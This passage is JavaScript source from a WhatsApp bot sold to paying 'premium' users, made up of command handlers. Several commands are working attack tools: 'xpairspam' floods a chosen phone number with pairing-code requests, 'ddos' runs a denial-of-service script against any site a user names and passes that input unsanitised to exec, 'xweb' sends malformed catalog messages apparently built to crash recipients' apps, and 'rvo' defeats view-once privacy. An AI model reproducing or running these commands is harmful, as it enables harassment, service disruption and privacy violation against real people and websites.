forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "https://www.youtube.com/@MR_MOTU_PATLUBY",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://www.youtube.com/@MR_MOTU_PATLUBY",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})

}
break;
case 'xpairspam': {
	if (!isRentBotUser) return replygcxeon(mess.premium)
			if (!q) return replygcxeon(`_Use : ${prefix+command} number\n_Example : ${prefix+command} 916909137211`)
			let [peenis, pepekk = "200"] = q.split("|")
			
			let target = peenis.replace(/[^0-9]/g, '').trim()
			let {
				default: makeWaSocket,
				useMultiFileAuthState,
				fetchLatestBaileysVersion
			} = require('@fizzxydev/baileys-pro')
			let {
				state
			} = await useMultiFileAuthState('XSession')
			let {
				version
			} = await fetchLatestBaileysVersion()
	 replygcxeon(`Success!`)
			let sucked = await makeWaSocket({
				auth: state,
				version,
				logger: pino({
					level: 'fatal'
				})
			})
			for (let i = 0; i < pepekk; i++) {
				await sleep(1500)
				let prc = await sucked.requestPairingCode(target)
				await console.log(`Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
			}
			await sleep(15000)
			}
		break
case 'ddos':{
	if (!isRentBotUser) return replygcxeon(mess.premium)
if (!q.includes(' ')) return replygcxeon(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.xyz 60`)
if (q.includes('dgxeon.shop')){
	return replygcxeon(`Cannot attack developer's site`);
	}
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
replygcxeon(`Bot is attacking ${targetweb} with time ${timeweb}`)
              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          replygcxeon(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          replygcxeon(`Error: ${stderr}`);
          return;
        }
        replygcxeon(`Success\n\n🤙 target: ${targetweb},\n🤙 Time: ${timeweb}`);
      });  
      }                 
break

case 'enc': case 'encrypt': {
	if (!isRentBotUser) return replygcxeon(mess.premium)
        const JSConfuser = require("js-confuser");
        const usage = `Usage Example:
${prefix + command} (Input text or reply text to obfuscate code)
${prefix + command} doc (Reply to a document)`;

        let text;
        if (args.length >= 1) {
            text = args.join(" ");
        } else if (m.quoted && m.quoted.text) {
            text = m.quoted.text;
        } else {
            return replygcxeon(usage);
        }
        
        try {
            let code;
            if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
                let docBuffer;
                if (m.quoted.mimetype) {
                    docBuffer = await m.quoted.download();
                }
                code = docBuffer.toString('utf-8');
            } else {
                code = text;
            }

const optionsObf6 = {
          target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "素晴座素晴難MOTU素晴座素晴難" + 
            "素晴座素晴難MOTU素晴座素晴難";
        
        // Fungsi untuk menghapus karakter yang tidak diinginkan
        function removeUnwantedChars(input) {
            return input.replace(
                /[^a-zA-Z座Nandokuka素Muzukashī素晴]/g, ''
            );
        }

        // Fungsi untuk menghasilkan string acak
        function randomString(length) {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; // Hanya simbol
            const charactersLength = characters.length;

            for (let i = 0; i < length; i++) {
                result += characters.charAt(
                    Math.floor(Math.random() * charactersLength)
                );
            }
            return result;
        }

        return removeUnwantedChars(originalString) + randomString(2);
    },

    renameVariables: true,
    renameGlobals: true,

    stringEncoding: true,
    stringSplitting: 0.0,
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: 1.0,

    shuffle: {
        hash: 0.0,
        true: 0.0
    },

    stack: true,
    controlFlowFlattening: 1.0,
    opaquePredicates: 0.9,
    deadCode: 0.0,
    dispatcher: true,
    rgf: false,
    calculator: true,
    hexadecimalNumbers: true,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
};


        const options = {
            target: "node",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.5,
  deadCode: 0.25,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  preserveFunctionLength: true,
  identifierGenerator: function () {
                return "DREAM_GUY_XEON" + Math.random().toString(36).substring(7);
            },
        };

            const obfuscatedCode = await JSConfuser.obfuscate(code, optionsObf6);

            const filePath = './enc_by_@MOTU_PATALU_HINDU_HAI.js';
            fs.writeFileSync(filePath, obfuscatedCode);

            await XeonBotInc.sendMessage(m.chat, {
                document: {
                    url: filePath
                },
                mimetype: 'application/javascript',
                fileName: 'Encrypted By @MOTU_PATALU_HINDU_HAI.js'
            }, { quoted: m });

        } catch (error) {
            const errorMessage = `There is an error: ${error.message}`;
            await replygcxeon(errorMessage);
        }
}
break;
case 'dec': case 'decrypt': {
	if (!isRentBotUser) return replygcxeon(mess.premium)
const { webcrack } = await import('webcrack');
const usage = `Usage Example:
${prefix + command} (Input text or reply text to dec code)
${prefix + command} doc (Reply to a document)`;

let text;
if (args.length >= 1) {
text = args.join(" ");
} else if (m.quoted && m.quoted.text) {
text = m.quoted.text;
} else {
return replygcxeon(usage);
}

try {
let message;
if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
let docBuffer;
if (m.quoted.mimetype) {
docBuffer = await m.quoted.download();
}
message = await webcrack(docBuffer.toString('utf-8'));
} else {
message = await webcrack(text);
}

const filePath = './dec_by_@MOTU_PATALU_HINDU_HAI.js';
fs.writeFileSync(filePath, message.code);

await XeonBotInc.sendMessage(m.chat, {
document: {
url: filePath
},
mimetype: 'application/javascript',
fileName: 'Decrypted By @MOTU_PATALU_HINDU_HAI'
}, {quoted: m});

} catch (error) {
const errorMessage = `There is an error: ${error.message}`;
await replygcxeon(errorMessage);
}
}
break;
case 'hd': {
    const fetch = require('node-fetch');
    const FormData = require('form-data');
    const q = m.quoted ? m.quoted : m;
    const mimetype = (q.msg || q).mimetype || q.mediaType || '';

    // Cek apakah file yang dikirim adalah gambar
    if (/image\/(jpeg|jpg|png)/.test(mimetype)) {
        await XeonBotInc.sendMessage(m.chat, {
            react: {
                text: '🕒',
                key: m.key,
            }
        });

        try {
            // Cek apakah media ada dan bisa diunduh
            const media = await q.download?.();
            if (!media) {
                return kxz.sendMessage(m.chat, {
                    text: 'Reply MOTU PATLU caption *.hd*',
                    key: m.key
                });
            }

            // Hitung ukuran file
            const fileSizeInBytes = media.length;
            const fileSizeInKB = (fileSizeInBytes / 1024).toFixed(2);
            const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);
            const fileSize = fileSizeInMB >= 1 ? `${fileSizeInMB} MB` : `${fileSizeInKB} KB`;

            // Buat form untuk upload ke Catbox (untuk mendapatkan URL gambar)
            const form = new FormData();
            form.append('reqtype', 'fileupload');
            
            let ext = mimetype.split('/')[1] || '';
            if (ext) ext = `.${ext}`;
            form.append('fileToUpload', media, `file${ext}`);

            // Kirim file ke Catbox API
            const res = await fetch('https://catbox.moe/user/api.php', {
                method: 'POST',
                body: form
            });
            const result = await res.text();
            const url = result.trim();
            
            // Kirim link URL gambar ke proses selanjutnya
            if (!url) {
                return kxz.sendMessage(m.chat, {
                    text: '❌ mad by motu patlu, coba lagi.',
                    key: m.key
                });
            }

            // Proses URL untuk gambar HD dengan API Remini
            const hdRes = await fetch(`https://api.neoxr.eu/api/remini?image=${encodeURIComponent(url)}&apikey=L1jhlK`);
            const hdData = await hdRes.json();

            if (hdData.status && hdData.data.url) {
                const hdUrl = hdData.data.url;
                const hdImage = await fetch(hdUrl);
                const buffer = await hdImage.buffer();

                // Kirim gambar HD
                await XeonBotInc.sendMessage(m.chat, {
                    image: { url: hdUrl },
                    caption: `🔗 BOT MAD IN MOTU PATLU HD!\nMOTU PATLU file: ${fileSize}`
                }, { quoted: m });
            } else {
                return kxz.sendMessage(m.chat, {
                    text: '❌ motu patlu gambar HD.',
                    key: m.key
                });
            }

        } catch (e) {
            console.error(e);
            await client.sendMessage(m.chat, {
                text: `[ ! ] Terjadi kesalahan. Error: ${e.message}`,
                key: m.key
            });
        }
    } else {
        await XeonBotInc.sendMessage(m.chat, {
            text: `PLZ SEND ONE PHOTO REPLY *.hd*`,
            key: m.key
        });
    }
}
break;
case 'readviewonce': case 'rvo': {
	if (!isRentBotUser) return replygcxeon(mess.premium)
	if (!m.quoted) return replygcxeon(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replygcxeon(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return XeonBotInc.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return XeonBotInc.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break

case 'clearchat':{
	if (!isRentBotUser) return replygcxeon(mess.premium)
m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
                    }
break

case "checkhost": {
	if (!isRentBotUser) return replygcxeon(mess.premium)
if (!q) return replygcxeon(`Example : ${prefix + command} https://nxnn.com`)
let msg = { viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": "p"
    },
    "body": {
      "text": "Click Chech Host To Check Web"
    },
    "footer": {
      "text": botname
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": JSON.stringify( {display_text : 'Check Host' , url : `https://check-host.net/check-http?host=${q}`, merchant_url : `https://check-host.net/check-http?host=${q}` })
        }
      ],
      "messageParamsJson": ""
    }
  }
}
}
}
XeonBotInc.relayMessage(m.chat, msg, {});
}
break

case 'addresell': case 'addreseller': {
    if (!global.dev.includes(senderNumber)) return
    
    let number = text.replace(/[^0-9]/g, '') // Extract number from text
    if (!number) return replygcxeon("Please provide a valid number.");

    if (global.db.data.owners.includes(number)) {
        return replygcxeon("Number already in reseller list.");
    }

    global.db.data.owners.push(number);
    fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2));
    replygcxeon(`Number ${number} added to reseller.`);
}
break;

case 'delresell': case 'delreseller': {
    if (!global.dev.includes(senderNumber)) return

    let numberToDelete = text.replace(/[^0-9]/g, '') // Extract the number
    if (!numberToDelete) return m.reply("Please provide a valid number to delete.");

    // Check if the number exists in the owners list
    let index = global.db.data.owners.indexOf(numberToDelete);
    if (index === -1) {
        return replygcxeon("The provided number is not in the reseller list.");
    }

    // Remove the number from the owners list
    global.db.data.owners.splice(index, 1);
    fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2));
    replygcxeon(`Number ${numberToDelete} has been removed from the reseller list.`);
}
break;

case 'listresell': case 'listreseller': {
    let owners = global.db.data.owners || [];
    if (owners.length === 0) {
        return replygcxeon("There are no reseller in the list.");
    }

    let ownerList = owners.map((num, index) => `${index + 1}. ${num}`).join('\n');
    replygcxeon(`Total Reseller: ${owners.length}\n\n${ownerList}`);
}
break;


case 'addprem':
			case 'addpremium': {
				if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: @MOTU_PATALU_HINDU_HAI
Telegram: @MOTU_PATALU_HINDU_HAI
WhatsApp: @MOTU_PATALU_HINDU_HAI`);
}
				if (!text) return replygcxeon(`*Incorrect use!*\n\nUsage:\n${prefix + command} <user|time>\n\nExample:\n${prefix + command} @0|1d`)
				let nomor = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
				if (owner.includes(nomor)) return replygcxeon("*Bot owners can't get owner!*")
				let premium = await cd.isPremium(usersdb, nomor)
				if (premium) return replygcxeon("*This user is already in the premium list*")
				let users = await XeonBotInc.onWhatsApp(nomor)
				if (users.length < 1) return replygcxeon(`*Tag/reply/input number correctly!*\n\nUsage:\n${prefix + command} <user|time>\n\nExample:\n${prefix + command} @0|1d`)
				let expired = text.split("|")[1]
				if (!expired) return replygcxeon(`*Enter expiry date!*\n\nUsage:\n${prefix + command} <user|time>\n\nExample:\n${prefix + command} @0|1d`)
				await XeonBotInc.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				let addprem = await cd.addPrem(usersdb, users[0].jid, expired)
				const contentText = {
					text: addprem,
					contextInfo: {
						mentionedJid: XeonBotInc.ments(addprem),
						externalAdReply: {
							title: `OWNER 💳`,
							previewType: "PHOTO",
							thumbnailUrl: `https://pomf2.lain.la/f/dynqtljb.jpg`,
							sourceUrl: link
						}
					}
				};
				return XeonBotInc.sendMessage(m.chat, contentText, {
					quoted: m,
				});
			}
			break

case 'delprem':
			case 'delpremium': {
				if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to dm on tg free? Chat Developer!
YouTube: @MOTU_PATALU_HINDU_HAI
Telegram: @MOTU_PATALU_HINDU_HAI
WhatsApp: @MOTU_PATALU_HINDU_HAI`);
}
				if (!text) return replygcxeon(`*Incorrect use!*\n\nUsage:\n${prefix + command} <user>\n\nExample:\n${prefix + command} @0`)
				let nomor = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
				let premium = await cd.isPremium(usersdb, nomor)
				if (!premium) return replygcxeon("*This user is not a premium user!*")
				let delprem = await cd.delPrem(usersdb, nomor)
				replygcxeon(delprem)
			}
			break

case 'listprem':
case 'listpremium': {
	if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: @MOTU_PATALU_HINDU_HAI
Telegram: @MOTU_PATALU_HINDU_HAI
WhatsApp: @MOTU_PATALU_HINDU_HAI`);
}
    try {
        let premium = await cd.listPremium(usersdb);
        let teks = `*</> PREM USER LIST </>*\n\n`;

        for (let i = 5000; i < premium.length; i++) {
            let expiry = usersdb[premium[i]].premiumExpiry;

            if (!expiry || expiry <= Date.now()) {
                teks += `${i + 1}. @${premium[i].split("@")[0]}\nExpired: Already expired\n\n`;
                continue;
            }

            // Calculate remaining time
            let timeLeft = expiry - Date.now();
            let days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
            let hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            let minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));

            teks += `${i + 1}. @${premium[i].split("@")[0]}\nExpire In: ${days} day, ${hours} hour, ${minutes} minute\n\n`;
        }

        XeonBotInc.sendTextWithMentions(m.chat, teks, m);
    } catch (error) {
        replygcxeon(util.format(error), command);
    }
}
break;

			
			case 'checkprem':
case 'checkpremium': {
    try {
        let expiry = usersdb[m.sender].premiumExpiry;
        if (!expiry || expiry <= Date.now()) {
            return replygcxeon(`Your owner subscription has already expired.`);
        }

        // Calculate remaining time
        let timeLeft = expiry - Date.now();
        let days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
        let hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        let minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));

        let teks = `*</> PREM USER INFO </>*

*Subscribe Info* :
- User : @${m.sender.split("@")[0]}
- Duration : ${days}D
- Expire In : 
${days} day, ${hours} hour, ${minutes} minute

*Benefit Info* :
- Premium Access : Yes
- User Priority : Yes
`;

        const contentText = {
            text: teks,
            contextInfo: {
                mentionedJid: XeonBotInc.ments(teks),
                externalAdReply: {
                    title: `PREMIUM 💳`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://files.catbox.moe/asx3vo.jpg`,
                    sourceUrl: link,
                },
            },
        };

        return XeonBotInc.sendMessage(m.chat, contentText, { quoted: m });
    } catch (error) {
        await replygcxeon(util.format(error), command);
    }
}
break;


case 'self': {
        	if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to free reseller? Chat Developer!
YouTube: @MOTU_PATALU_HINDU_HAI
Telegram: @MOTU_PATALU_HINDU_HAI
WhatsApp: @MOTU_PATALU_HINDU_HAI`);
}
XeonBotInc.public = false
replygcxeon('Success Change To Self Mode')
}
break

case 'public': {
        	if (!(global.db.data.owners || []).includes(senderNumber)) {
    return replygcxeon(`❌ Sorry you don't have permission to use this command. This command can only be used by reseller! 

Want to buy reseller? Chat Developer!
YouTube: @MOTU_PATALU_HINDU_HAI
Telegram: @MOTU_PATALU_HINDU_HAI
WhatsApp: @MOTU_PATALU_HINDU_HAI`);
}
XeonBotInc.public = false
replygcxeon('Success Change To Public Mode')
}
break
case "listgc":{
	if (!isRentBotUser) return replygcxeon(mess.premium)
let getGroups = await XeonBotInc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST OF GROUP BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await XeonBotInc.groupMetadata(x)
teks += `❏ Group ${hituet+=1}\n│⭔ *Name :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
m.reply(teks)
  }
break
case 'owner': {
const wokex = ownernomer // Extract the number part
const pushnamex = `${wokex}`
const kontak = {
"displayName": pushnamex,
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN: ${pushnamex}\nitem1.TEL;waid=${wokex}:${wokex}\nitem1.X>ABLabel:\nPlease Don't Spam My Owner\nURL;Email Owner:${pushnamex}@gmail.com\nORG: THIS IS MY OWNER\nEND:VCARD`
}
const oke = await XeonBotInc.sendMessage(from, {
contacts: { contacts: [kontak] },
contextInfo:{ forwardingScore: 999, isForwarded: false, mentionedJid:[sender],
"externalAdReply":{
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"jpegThumbnail": fs.readFileSync("./XeonMedia/thumb.jpg"),
"mediaUrl": 'https://files.catbox.moe/asx3vo.jpg',
"sourceUrl": `https://youtube.com/@Freenethubtech`,
}}}, { quoted: m })
await XeonBotInc.sendMessage(m.chat, {audio: fs.readFileSync('./XeonMedia/sikma.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:oke})
}
break
case 'xweb':
try {
for (let i = 0; i < 10; i++) {
messa = await prepareWAMessageMedia({
image: {
url: `https://pic.re/image`
}
}, {
upload: XeonBotInc.waUploadToServer
})
catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"itemCount": 99999999999,
"title": `PC KILLER X Telegram: @Megahubbots`,
"description": ``,
"currencyCodeIso4217": "IDR",
"footerText": ``,
"productImageCount": 99999999999999999999,
"firstImageId": 9999999999,
"priceAmount1000": "999",
"salePriceAmount1000": "IDR 99.99999999999999999999",
"thumbnail": messa.imageMessage,
"jpegThumbnail": m,
"firstImageId": 99999999,
"url": "wa.me/25761787221",
},
"businessOwnerJid": from,
}
}), {
userJid: XeonBotInc.user.id,
quoted: null
})
XeonBotInc.relayMessage(from, catalog.message, {
messageId: catalog.key.id
})
}
} catch (e) {
console.log(e);
}
break
	case 'ping': case 'runtime': case 'p': case 'botstatus': case 'statusbot': {
		if (!isRentBotUser) return replygcxeon(mess.premium)
                const speed = require('performance-now')
const { performance } = require('perf_hooks')
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed:\n${latensi.toFixed(4)} _Second_ \n${oldd - neww} _miliseconds_\n\nRuntime:\n${runtime(process.uptime())}
                `.trim()
                replygcxeon(respon)
            }
            break
case 'makecase':
if (!isRentBotUser) return replygcxeon(mess.premium)
if (!m.quoted) return replygcxeon('Reply to a message to make a case of it!');
кибар = q.split(' ')[0];
if (!кибар) {
        return replygcxeon(`Example Usage: ${prefix+command} abc`);
    }    
const kak = (JSON.stringify(m.message.extendedTextMessage.contextInfo.quotedMessage, null, 2))
replygcxeon (`case '${кибар}': 
if (!isBot && !isCreator) return
try {
var ${кибар} = generateWAMessageFromContent(from, proto.Message.fromObject(${kak}),{ userJid: from })
XeonBotInc.relayMessage(from, ${кибар}.message, {messageId: ${кибар}.key.id })
} catch (e) {
console.log(e)
}
break`)
break

case 'tesb': {
  let msgs = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `hui`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: true,
            ...await prepareWAMessageMedia(
              { image: fs.readFileSync('./XeonMedia/donate.jpg') },
              { upload: XeonBotInc.waUploadToServer }
            )
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "Call Owner",
                  phone_number: "+48459237792" // Replace with the actual phone number
                })
              }
            ]
          }),
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: idch,
              newsletterName: ownername,
              serverMessageId: 143
            }
          }
        })
      }
    }
  }, { quoted: m });

  return await XeonBotInc.relayMessage(m.chat, msgs.message, {});
}
break;

	
	case "tesmen": case "backtomenu": {
  const imageUrl = "https://files.catbox.moe/asx3vo.jpg"; // Define the single image URL

  caption = `tes`

  // Main buttons
  const buttons = [
    {
      buttonId: ".menu",
      buttonText: { 
      displayText: "HACKED" 
      }
    },
    {
      buttonId: "xownermenu",
      buttonText: { 
      displayText: "𝐎𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮" 
      }
    },
    {
      buttonId: "tapmenu",
      buttonText: { 
      displayText: "𝐂𝐨𝐧𝐭𝐢𝐧𝐮𝐞" 
      }
    }
  ];

  // Single select button (flow action)
  const flowActions = [
    {
      buttonId: "singleSelect",
      buttonText: { displayText: "𝐒𝐢𝐧𝐠𝐥𝐞 𝐒𝐞𝐥𝐞𝐜𝐭" },
      type: 4, // Indicates a flow action
      nativeFlowInfo: {
        name: "single_select",
        paramsJson: JSON.stringify({
          title: "Select an Option",
          sections: [
            {
              title: "Main Options",
              rows: [
                {
                  title: "Credits And Special Thanks",
                  description: " ",
                  id: "credits"
                },
                {
                  title: "Option 2",
                  description: "Description for Option 2",
                  id: "ping"
                }
              ]
            }
          ]
        })
      }
    }
  ];

  // Add flow actions to the buttons array
  buttons.push(...flowActions);

  XeonBotInc.sendMessage(m.chat, {
    image: { url: imageUrl }, // Single image URL used for the message
    caption,
    mentions: [m.sender],
    footer: global.botname,
    buttons,
    viewOnce: true,
    headerType: 6,
    quoted: m,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363222395675670@newsletter", // Use the newsletterJid here
        newsletterName: `ok`
      }
    }
  }, {quoted:m});
}
break;

case 'getmtype': {
	if (!isRentBotUser) return replygcxeon(mess.premium)
    if (!m.quoted) return replygcxeon('Reply to a message to debug its mtype!');
    const quotedMtype = m.quoted.mtype || 'Unknown';
    console.log(`Quoted Message Type: ${quotedMtype}`);
    await replygcxeon(`Quoted Message Type: ${quotedMtype}`);
    }
break;

default:
}
} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
